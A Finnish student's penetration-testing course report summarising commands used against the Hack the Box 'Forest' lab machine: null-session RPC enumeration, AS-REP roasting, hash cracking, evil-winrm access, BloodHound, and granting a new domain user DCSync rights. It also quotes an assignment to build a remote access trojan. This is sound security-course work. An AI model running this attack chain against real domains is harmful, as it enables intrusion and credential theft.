# Final Countdown

## Sisällysluettelo

* TOC 
{:toc}

## Vinkkejä opettajalta tehtäviin
  _Läksyjen raportteja löydät Googlella ja DuckDuckGo:lla sekä tämän sivun kommenteista. "Palauta kaikki" -kohtaan linkkejä tulee kuusi kappaletta, sellaisia klikattavia (a href).
    - Linkki kommenteissa tämä linkki voi nostaa sivusi PageRankkia, jolloin pääset Googlen hakutuloksissa ylöspäin. Jos laitat linkin nopeasti, saatat saada linkkejä myös kurssikavereilta, kun "Joukkoäly" -kohdassa muut viittaavat kotitehtäviisi.
    - TTPs - Tools, tactics and procedures. Kun teet tiivistelmää joukkoälystä, voit esimerkiksi poimia sopivia ohjelmia, valmiita käskyjä, esimerkkitilanteita joihin ohjelma sopii ja lähestymistapoja, joilla erityyppisiin maaleihin tunkeudutaan.
    - Tässä ei ole tarpeellista jättää troijalaisten binäärejä näkyviin, sillä nehän eivät usein edes toimi ilman kontrollipalvelimia. Verkosta löytyvissä esimerkeissä malware näytteet ovat usein kryptatussa ZIP-paketissa, jonka salasana (esim "This package contains live malware") kerrotaan jossain sivulla. Paketissa on usein myös README, jossa asia väännetään rautalangasta, ja malware on joskus varoittavasti nimetty "malware-trojan.exe".
    - Tässä harjoituksessa ei tarvitse ohittaa virustorjuntaa, voit laittaa sen harjoitusmaalista pois päältä.

# z) Tiivistä
_Nikon lähteet - silmäile ja tiivistä Nikon mainitsemat kolme lähdettä. Ne ovat sähköpostiviestissä "Wind0wned & oma kirjakauppa". Osa lähteistä on hyvin laajoja, tällöin voit silmäillä muutamia keskeisiä osia niistä._

Tiivistyksessä on kyse [vierailuluennolla](https://nihti.github.io/pentest/se7en.html#vierailijaluento) käytetyistä komennoista ja niiden taustoista. Maalina on [Hack the Boxin](https://www.hackthebox.com/) "Forest" kone. 

## MSRPC (Microsoft Remote Procedure Call)
0xffsec Handbook: [https://0xffsec.com/handbook/services/msrpc/](https://0xffsec.com/handbook/services/msrpc/)

  - HackTricksin esitys MSRPC:stä: [https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)
  - MSRPC default Ports: 
      - RPC Endpoint Mapper: 135
      - HTTP: 593

## Null Session
0xffsec Handbook: [https://0xffsec.com/handbook/services/smb/#null-session](https://0xffsec.com/handbook/services/smb/#null-session)

_The `rpcclient` can be used to interact with individual RPC endpoints via named pipes. By default, Windows systems and Windows 2003 domain controllers allow anonymous (Null Sessions) access to SMB, so these interfaces can be queried in this way._

  - SMB HackTricksin sivuilla kuvattuna (myös null sessionista juttua): [https://book.hacktricks.xyz/pentesting/pentesting-smb](https://book.hacktricks.xyz/pentesting/pentesting-smb)
  - SMB default Ports: 
    - SMB over NBT (NetBIOS over TCP/IP): 139
    - SMB over TCP/IP: 445

### Komennot

```bash
 rpcclient -U '' -N 10.10.10.161
# Get users
enumdomusers
# AS-REP Roast
impacket-GetNPUsers -usersfile users.lst -dc-ip 10.10.10.161 htb.local/
# Crack The Hash
# Note that a txt file is required as a wordlist
# hashcat -m 18200 alfresco.hash /usr/share/wordlists/rockyou.txt --force
# Remote In The Machine
# Install `evil-winrm`
sudo gem install evil-winrm
# remote into the machine
evil-winrm -i 10.10.10.161 -u svc-alfresco
```

## SharpHound: BloodHound Collectors 
[https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

  - BloodHound HackTricksin sivuilla esitettynä: [https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound)
  - BloodHoundin dokumentaatio ja kuvaus Collectors-branchissa olevasta SharpHoundista 

### Komennot 

```bash
# Installation
sudo apt install bloodhound
# Start neo4j
sudo neo4j console
# [...snip...]
2021-12-01 16:32:34.562+0000 INFO  Remote interface available at 
http://localhost:7474/
# [...snip...]
# Go to http://localhost:7474/ and authenticate with `neo4j:neo4j` and
# give it a new password.
# Run bloodhound
bloodhound
```

## Exploiting AD: Add-DomainObjectAcl syntax 
Correct Add-DomainObject syntax (PowerView sivun alaotsikko): [https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview#set-values](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview#set-values)

### Komennot

```powershell
# Import just powerview
. .\PowerView.ps1
```
```cmd
# Add new user to domain
net users heiskane password /add /domain
# Add user to domain group
net group "Exchange Windows Permissions" /add heiskane
```
```powershell
# Give DCSync rights to `heiskane`
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object 
System.Management.Automation.PSCredential('HTB.LOCAL\heiskane', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity 
"DC=htb,DC=local" -PrincipalIdentity heiskane -Rights DCSync
```

# a) Palauta kaikki
_Palauta kaikki. Laita tähän a-kohtaan linkki jokaiseen kotitehtäväraporttiisi._

  - [H1:](h1.md)
  - [H2:](h2.md)
  - [H3:](h3.md)
  - [H4:](h4.md)
  - [H5:](h5.md)
  - [H6:](h6.md)
  - [H7:](h7.md)

# b) Googlen kärkeen
_Vapaaehtoinen, mutta helppo ja suositeltava: lisää linkki tehtäviisi tämän sivun [https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h7-final-countdown](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h7-final-countdown) perään kommentiksi._

# c) Viittaukset kuntoon 
_Katso, että olet jokaisessa tehtävässä (h1, h2...) viitannut kurssiin ja kaikkiin muihinkin lähteisiin. Lähdeviitettä edellyttäviä lähteitä ovat kaikki materiaali, jota olet käyttänyt lähteenä. Esimerkiksi kurssi, tehtävänanto, toisten opiskelijoiden vanhat raportit, kirjat, videot, ohjelmien man-sivut ja artikkelit. Mikäli teet kotitehtäviisi lisää testejä tai kokeiluja, tee ne selkeästi jatkoksi uuden otsikon alle ja merkitse, milloin lisäykset on tehty. Historia ei voi enää muuttua._ 

## Puuttuvat viitteet
Kerran en merkinnyt tehtävässä käytettyä [lähdettä](https://www.youtube.com/watch?v=Og3vNKnUSac) ([raportista](https://nihti.github.io/pentest/h3.html#a2-broken-authentication-1) voi lukea miksi...) ja muutamasta tehtävänpalautuksesta puuttui viittaus tehtävänantoon. Nämä on nyt korjattu. 

## Tehtäväpalautusten jälkeen muokautut tehtävät  
Pari kertaa olen jatkanut kotitehtävien tekemistä palautusajan jälkeen ja tällöin merkinnyt "EDIT:" jatkettuun kohtaan. Lisäksi luentojen muistiinpanoja olen muokannut mieleni mukaan sillä ne eivät ole tehtäväpalautuksia. 

  - [H3: Att&ckin alatekniikat: John the Ripper](https://nihti.github.io/pentest/h3.html#john-the-ripper)
  - [H3: Pizza fantasia: Nessus](https://nihti.github.io/pentest/h4.html#nessus)

## Harjoitusten muutoshistoriat
Koko sivuston muutoshistoria löytyy kuitenkin GitHubista, olen pyrkinyt myös laittamaan jollakin tapaa muutosta kuvaavia commit messageja muutosten mukaan. Harjoitusten muutoshistoriat: 

  - H1: [https://github.com/nihti/pentest/commits/gh-pages/h1.md](https://github.com/nihti/pentest/commits/gh-pages/h1.md)
  - H2: [https://github.com/nihti/pentest/commits/gh-pages/h2.md](https://github.com/nihti/pentest/commits/gh-pages/h2.md)
  - H3: [https://github.com/nihti/pentest/commits/gh-pages/h3.md](https://github.com/nihti/pentest/commits/gh-pages/h3.md)
  - H4: [https://github.com/nihti/pentest/commits/gh-pages/h4.md](https://github.com/nihti/pentest/commits/gh-pages/h4.md)
  - H5: [https://github.com/nihti/pentest/commits/gh-pages/h5.md](https://github.com/nihti/pentest/commits/gh-pages/h5.md)
  - H6: [https://github.com/nihti/pentest/commits/gh-pages/h6.md](https://github.com/nihti/pentest/commits/gh-pages/h6.md)
  - H7: [https://github.com/nihti/pentest/commits/gh-pages/h7.md](https://github.com/nihti/pentest/commits/gh-pages/h7.md)

# d) Joukkoäly
_- silmäile muiden kotitehtäväraportit, kerää lista parhaita komentoja ja havaintoja. Muista merkitä lähteet. Näin saat oman tiivistelmän parhaista tunkeutumistekniikoista. (Tästä voi olla hyötyä myös ensi viikolla). Jos sinulla on suosikkilähteitä kurssin ulkopuoleta, voit listata nekin tähän. Teh ultimate haking cheatsheet!_

## Kurssilaisten raportit

  - Sami Kulonpään raportit (suomeksi), miellyttävä ilme ja oikea domain ja salasanasuojaus luovat heti asiallista tunnelmaa: [https://kulonpaa.com/](https://kulonpaa.com/)
  - Eemil Airaksisen raportit (suomeksi), miellyttävä WP-teema: [https://eemilairaksinen.wordpress.com/blog/](https://eemilairaksinen.wordpress.com/blog/)
  - Atro Lindellin raportit (suomeksi), sama miellyttävä teema, paljon ovat kaikki kurssilaiset selvästi vaivaa tehtäviin nähneet: [https://juusokalliomaki.com/blog/](https://juusokalliomaki.com/blog/)
  - Toni Kerttulan raportit (suomeksi), samalla WP-teemalla mennään, harjoitukset ovat näkyvillä vain vitoseen asti: [https://tonikerttula.wordpress.com/](https://tonikerttula.wordpress.com/)
  - Otto Hännisen raportit (suomeksi), -"-, lähteet lopussa ja ytimekäs yhteenveto lopussa hyvä lisä: [https://ottohanninen.wordpress.com/blog/](https://ottohanninen.wordpress.com/blog/)
  - Teemu Karhusen raportit (suomeksi), -""-, todella kattavista kuvakaappauksista plussaa: [https://teemukarhunencom.wordpress.com/](https://teemukarhunencom.wordpress.com/)
  - Juuso Kalliomäen raportit (englanniksi) eivät myöskään häviä lainkaan aiemmin mainituille ilmeessa tai sisällössä, käytetyt lähteet lopussa hyvä lisä: [https://juusokalliomaki.com/blog/](https://juusokalliomaki.com/blog/)
  - Evgenin raportit (suomeksi), ikävä kyllä oikeutta sivun juureen ei ollut mutta tehtäväraportit saa näkyviin vaihtamalla tehtävän numeron urlissa: [https://dev.introtech.fi/pentest/h1.html](https://dev.introtech.fi/pentest/h1.html)
  - Lisäksi jo [aiemmissa tuntimuistiinpanoissa mainittu](https://nihti.github.io/pentest/sharksoup.html#k%C3%A4%C3%A4rmeenkesytyst%C3%A4-taco-bell--ohjelmointia-terminaattori-ja-paljon-muuta) Juho Mikkosen blogi, joka ikävä kyllä ei sisällä (ainakaan julkisesti) tehtäväraportteja tai linkkiä niihin: [https://mikkonen.bio/](https://mikkonen.bio/)

# e) Rottia
_Tee troijan hevonen, joka asentaa vihamielisen etäkäyttöohjelman (RAT, remote access trojan). Haittaohjelmien toimivia versioita ei saa laittaa näkyviin siten, että joku voisi ajaa niitä vahingossa. Tässä tehtävässä harjoitellaan kohdennettua hyökkäystä, automaattisesti leviäviä itse itseään kopoioivia ohjelmia ei tehdä (ei viruksia, ei matoja). Tunnilla tehtiin elf-binääri msfvenomilla yhdistämättä sitä mihinkään tavalliseen ohjelmaan. Tee siis jollain omilla mausteilla (valitse näistä joku): 
    - Kohdekone verkon takana
    - Windows-kohde
    - Fat Rat
    - Veil
    - Social Engineering Toolkit
    - Makron hyödyntäminen
    - Yhdistetty toiseen ohjelmaan (esim msfvenom template)_
